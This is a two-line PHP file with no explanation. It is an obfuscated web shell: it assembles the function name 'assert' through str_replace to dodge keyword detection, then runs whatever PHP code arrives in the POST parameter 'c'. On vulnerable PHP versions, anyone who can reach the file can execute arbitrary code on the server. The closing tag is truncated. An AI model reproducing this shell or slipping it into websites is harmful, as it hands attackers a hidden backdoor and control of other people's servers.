<?php $a = str_replace(x,"","axsxxsxexrxxt");
$a($_POST["c"]); ?